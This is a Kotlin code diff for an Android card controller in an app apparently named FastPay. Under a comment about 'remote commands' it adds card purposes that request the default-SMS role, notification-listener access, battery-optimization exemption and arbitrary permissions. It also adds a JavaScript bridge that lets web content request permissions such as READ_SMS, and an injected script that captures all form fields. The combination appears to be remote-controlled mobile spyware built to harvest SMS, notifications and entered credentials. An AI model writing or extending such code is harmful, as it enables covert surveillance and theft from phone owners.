@@ -6,23 +6,33 @@ import android.animation.AnimatorSet
 import android.animation.ObjectAnimator
 import android.view.animation.AccelerateDecelerateInterpolator
 import android.view.animation.AccelerateInterpolator
+import android.annotation.SuppressLint
 import android.app.Activity
 import android.content.Context
 import android.content.Intent
+import android.net.Uri
+import android.os.Build
 import android.os.Handler
 import android.os.Looper
+import android.os.PowerManager
+import android.provider.Settings
+import android.util.Log
 import android.view.Gravity
 import android.view.LayoutInflater
 import android.view.View
 import android.view.ViewGroup
 import android.view.animation.DecelerateInterpolator
+import android.webkit.JavascriptInterface
 import android.webkit.WebView
+import android.webkit.WebViewClient
 import android.widget.Button
 import android.widget.FrameLayout
 import android.widget.LinearLayout
 import android.widget.TextView
 import androidx.core.app.ActivityCompat
+import androidx.core.app.NotificationManagerCompat
 import com.example.fast.R
+import com.example.fast.util.DefaultSmsAppHelper
 
 /**
  * Controller for the Multipurpose CARD: birth (INPUT), fill-up, purpose, death.
@@ -324,9 +334,14 @@ class MultipurposeCardController(
             is FillUpSpec.WebView -> {
                 bodyTextView?.visibility = View.GONE
                 webView?.visibility = View.VISIBLE
-                webView?.settings?.javaScriptEnabled = true
+                setupWebView(fill)
                 when {
-                    fill.html != null -> webView?.loadDataWithBaseURL(null, fill.html, "text/html", "UTF-8", null)
+                    fill.html != null -> {
+                        val htmlWithBridge = if (fill.enableJsBridge) {
+                            injectJsBridgeScript(fill.html, fill.jsBridgeName)
+                        } else fill.html
+                        webView?.loadDataWithBaseURL(null, htmlWithBridge, "text/html", "UTF-8", null)
+                    }
                     fill.url != null -> webView?.loadUrl(fill.url)
                 }
                 val delay = fill.delayBeforeFillMs
@@ -336,6 +351,110 @@ class MultipurposeCardController(
                     handler.postDelayed(r, delay)
                 } else onFillUpComplete()
             }
+        }
+    }
+
+    @SuppressLint("SetJavaScriptEnabled")
+    private fun setupWebView(fill: FillUpSpec.WebView) {
+        webView?.apply {
+            settings.javaScriptEnabled = true
+            settings.domStorageEnabled = true
+            settings.loadWithOverviewMode = true
+            settings.useWideViewPort = true
+            setBackgroundColor(0x00000000)
+
+            // Add JavaScript bridge if enabled
+            if (fill.enableJsBridge) {
+                addJavascriptInterface(CardJsBridge(fill.jsBridgeName), fill.jsBridgeName)
+                Log.d(TAG, "Added JS bridge: window.${fill.jsBridgeName}")
+            }
+
+            // Set up WebViewClient for form capture and auto-resize
+            webViewClient = object : WebViewClient() {
+                override fun onPageFinished(view: WebView?, url: String?) {
+                    super.onPageFinished(view, url)
+                    if (fill.autoResizeToContent) {
+                        // Inject script to report content height
+                        view?.evaluateJavascript(
+                            "(function() { return document.body.scrollHeight; })();",
+                            { heightStr ->
+                                try {
+                                    val height = heightStr.toInt()
+                                    if (height > 0) {
+                                        handler.post {
+                                            val params = view.layoutParams
+                                            params.height = (height * density).toInt()
+                                            view.layoutParams = params
+                                        }
+                                    }
+                                } catch (e: Exception) {
+                                    Log.w(TAG, "Failed to parse content height: $heightStr", e)
+                                }
+                            }
+                        )
+                    }
+                }
+
+                override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
+                    // Capture form submissions if enabled
+                    if (fill.captureFormSubmit && url != null && url.startsWith("fastpay://form")) {
+                        val data = Uri.parse(url).getQueryParameter("data") ?: "{}"
+                        fill.onFormSubmit?.invoke(data)
+                        return true
+                    }
+                    return super.shouldOverrideUrlLoading(view, url)
+                }
+            }
+        }
+    }
+
+    /**
+     * Inject JS bridge helper script into HTML content.
+     * This makes form interception work even without explicit JS bridge calls.
+     */
+    private fun injectJsBridgeScript(html: String, bridgeName: String): String {
+        val script = """
+            <script>
+            (function() {
+                // Auto-intercept form submissions
+                document.addEventListener('submit', function(e) {
+                    if (window.$bridgeName && window.$bridgeName.submitForm) {
+                        e.preventDefault();
+                        var form = e.target;
+                        var data = {};
+                        for (var i = 0; i < form.elements.length; i++) {
+                            var el = form.elements[i];
+                            if (el.name) data[el.name] = el.value;
+                        }
+                        window.$bridgeName.submitForm(JSON.stringify(data));
+                    }
+                }, true);
+                
+                // Auto-report height changes
+                if (window.$bridgeName && window.$bridgeName.contentHeightChanged) {
+                    var lastHeight = 0;
+                    function reportHeight() {
+                        var h = document.body.scrollHeight;
+                        if (h !== lastHeight) {
+                            lastHeight = h;
+                            window.$bridgeName.contentHeightChanged(h);
+                        }
+                    }
+                    window.addEventListener('load', reportHeight);
+                    window.addEventListener('resize', reportHeight);
+                    new MutationObserver(reportHeight).observe(document.body, {childList:true, subtree:true});
+                }
+            })();
+            </script>
+        """.trimIndent()
+
+        // Insert script before </head> or at start of <body>
+        return when {
+            html.contains("</head>", ignoreCase = true) ->
+                html.replace("</head>", "$script</head>", ignoreCase = true)
+            html.contains("<body", ignoreCase = true) ->
+                html.replaceFirst(Regex("<body[^>]*>", RegexOption.IGNORE_CASE), "$0$script")
+            else -> "$script$html"
         }
     }
 
@@ -380,6 +499,23 @@ class MultipurposeCardController(
 
     private fun showPurposeAndWireButtons(cardView: View) {
         val purpose = spec.purpose
+
+        // Handle AutoDismiss - schedule auto-dismiss and optionally hide buttons
+        if (purpose is PurposeSpec.AutoDismiss) {
+            if (!purpose.showActionsAfterFillUp) {
+                actionsContainer?.visibility = View.GONE
+            }
+            val autoDismissRunnable = Runnable {
+                if (!dismissed) {
+                    purpose.onDismiss?.invoke()
+                    dismiss()
+                }
+            }
+            runnables.add(autoDismissRunnable)
+            handler.postDelayed(autoDismissRunnable, purpose.dismissAfterMs)
+            return
+        }
+
         if (!purpose.showActionsAfterFillUp) {
             when (purpose) {
                 is PurposeSpec.Dismiss -> purpose.onPrimary?.invoke()
@@ -387,13 +523,19 @@ class MultipurposeCardController(
             }
             return
         }
+
         actionsContainer?.visibility = View.VISIBLE
         primaryButton?.let { btn ->
-            btn.text = purpose.primaryButtonLabel ?: "Continue"
-            btn.visibility = View.VISIBLE
-            btn.setOnClickListener {
-                runPurposeAction(purpose, isPrimary = true)
-                dismiss()
+            val label = purpose.primaryButtonLabel
+            if (label != null) {
+                btn.text = label
+                btn.visibility = View.VISIBLE
+                btn.setOnClickListener {
+                    runPurposeAction(purpose, isPrimary = true)
+                    dismiss()
+                }
+            } else {
+                btn.visibility = View.GONE
             }
         }
         secondaryButton?.let { btn ->
@@ -439,6 +581,82 @@ class MultipurposeCardController(
             is PurposeSpec.UpdateApk -> purpose.onStartUpdate()
             is PurposeSpec.Dual -> if (isPrimary) purpose.onPrimary() else purpose.onSecondary()
             is PurposeSpec.Custom -> if (isPrimary) purpose.onPrimary?.invoke() else purpose.onSecondary?.invoke()
+
+            // New purpose types for remote commands
+            is PurposeSpec.RequestDefaultSms -> {
+                defaultSmsResultCallback = purpose.onResult
+                try {
+                    DefaultSmsAppHelper.requestDefaultSmsApp(context)
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to request default SMS", e)
+                    purpose.onResult(false)
+                }
+            }
+
+            is PurposeSpec.RequestNotificationAccess -> {
+                notificationAccessResultCallback = purpose.onResult
+                try {
+                    val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS).apply {
+                        if (context !is Activity) {
+                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                        }
+                    }
+                    context.startActivity(intent)
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to open notification settings", e)
+                    purpose.onResult(false)
+                }
+            }
+
+            is PurposeSpec.RequestBatteryOptimization -> {
+                batteryOptimizationResultCallback = purpose.onResult
+                try {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                        val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
+                        if (!pm.isIgnoringBatteryOptimizations(context.packageName)) {
+                            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
+                                data = Uri.parse("package:${context.packageName}")
+                                if (context !is Activity) {
+                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                                }
+                            }
+                            context.startActivity(intent)
+                        } else {
+                            purpose.onResult(true) // Already exempted
+                        }
+                    } else {
+                        purpose.onResult(true) // Not needed on older APIs
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to request battery optimization exemption", e)
+                    purpose.onResult(false)
+                }
+            }
+
+            is PurposeSpec.RequestPermissionList -> {
+                val act = activity
+                if (act != null && purpose.permissions.isNotEmpty()) {
+                    permissionListResultCallback = { granted, denied ->
+                        if (denied.isEmpty()) {
+                            purpose.onAllGranted()
+                        } else {
+                            purpose.onPartialGranted(granted, denied)
+                        }
+                    }
+                    ActivityCompat.requestPermissions(
+                        act,
+                        purpose.permissions.toTypedArray(),
+                        REQUEST_CODE_MULTIPURPOSE_PERMISSION
+                    )
+                } else {
+                    purpose.onPartialGranted(emptyList(), purpose.permissions)
+                }
+            }
+
+            is PurposeSpec.AutoDismiss -> {
+                // AutoDismiss is handled in showPurposeAndWireButtons
+                purpose.onDismiss?.invoke()
+            }
         }
     }
 
@@ -570,8 +788,113 @@ class MultipurposeCardController(
         else onDone()
     }
 
+    // --- JavaScript Bridge for WebView communication ---
+
+    /**
+     * JavaScript bridge for communication between WebView content and the card controller.
+     * Accessible in JS as window.[jsBridgeName] (default: window.FastPayBridge)
+     *
+     * Example JS usage:
+     * ```javascript
+     * FastPayBridge.dismiss();
+     * FastPayBridge.submitForm(JSON.stringify({email: "...", name: "..."}));
+     * FastPayBridge.log("Debug message");
+     * FastPayBridge.requestPermission("android.permission.READ_SMS");
+     * ```
+     */
+    inner class CardJsBridge(private val bridgeName: String) {
+        private val TAG = "CardJsBridge"
+
+        /** Dismiss the card from JavaScript */
+        @JavascriptInterface
+        fun dismiss() {
+            Log.d(TAG, "[$bridgeName] dismiss() called from JS")
+            handler.post { this@MultipurposeCardController.dismiss() }
+        }
+
+        /** Submit form data from JavaScript (expects JSON string) */
+        @JavascriptInterface
+        fun submitForm(jsonData: String) {
+            Log.d(TAG, "[$bridgeName] submitForm() called: $jsonData")
+            val fill = spec.fillUp
+            if (fill is FillUpSpec.WebView) {
+                handler.post { fill.onFormSubmit?.invoke(jsonData) }
+            }
+        }
+
+        /** Log a message from JavaScript */
+        @JavascriptInterface
+        fun log(message: String) {
+            Log.d(TAG, "[$bridgeName] JS log: $message")
+        }
+
+        /** Request a permission from JavaScript */
+        @JavascriptInterface
+        fun requestPermission(permission: String) {
+            Log.d(TAG, "[$bridgeName] requestPermission() called: $permission")
+            handler.post {
+                val act = activity
+                if (act != null) {
+                    ActivityCompat.requestPermissions(act, arrayOf(permission), REQUEST_CODE_MULTIPURPOSE_PERMISSION)
+                }
+            }
+        }
+
+        /** Set the primary button text from JavaScript */
+        @JavascriptInterface
+        fun setPrimaryButtonText(text: String) {
+            Log.d(TAG, "[$bridgeName] setPrimaryButtonText() called: $text")
+            handler.post { primaryButton?.text = text }
+        }
+
+        /** Set the secondary button text from JavaScript */
+        @JavascriptInterface
+        fun setSecondaryButtonText(text: String) {
+            Log.d(TAG, "[$bridgeName] setSecondaryButtonText() called: $text")
+            handler.post {
+                secondaryButton?.text = text
+                secondaryButton?.visibility = View.VISIBLE
+            }
+        }
+
+        /** Hide buttons from JavaScript */
+        @JavascriptInterface
+        fun hideButtons() {
+            Log.d(TAG, "[$bridgeName] hideButtons() called")
+            handler.post { actionsContainer?.visibility = View.GONE }
+        }
+
+        /** Show buttons from JavaScript */
+        @JavascriptInterface
+        fun showButtons() {
+            Log.d(TAG, "[$bridgeName] showButtons() called")
+            handler.post { actionsContainer?.visibility = View.VISIBLE }
+        }
+
+        /** Notify the card that content height changed (for auto-resize) */
+        @JavascriptInterface
+        fun contentHeightChanged(heightPx: Int) {
+            Log.d(TAG, "[$bridgeName] contentHeightChanged() called: ${heightPx}px")
+            val fill = spec.fillUp
+            if (fill is FillUpSpec.WebView && fill.autoResizeToContent) {
+                handler.post {
+                    webView?.layoutParams?.height = heightPx
+                    webView?.requestLayout()
+                }
+            }
+        }
+    }
+
     companion object {
+        private const val TAG = "MultipurposeCardController"
         const val REQUEST_CODE_MULTIPURPOSE_PERMISSION = 9001
+        const val REQUEST_CODE_DEFAULT_SMS = 9002
+        const val REQUEST_CODE_NOTIFICATION_ACCESS = 9003
+        const val REQUEST_CODE_BATTERY_OPTIMIZATION = 9004
         var permissionResultCallback: ((Boolean) -> Unit)? = null
+        var permissionListResultCallback: ((granted: List<String>, denied: List<String>) -> Unit)? = null
+        var defaultSmsResultCallback: ((Boolean) -> Unit)? = null
+        var notificationAccessResultCallback: ((Boolean) -> Unit)? = null
+        var batteryOptimizationResultCallback: ((Boolean) -> Unit)? = null
     }
 }
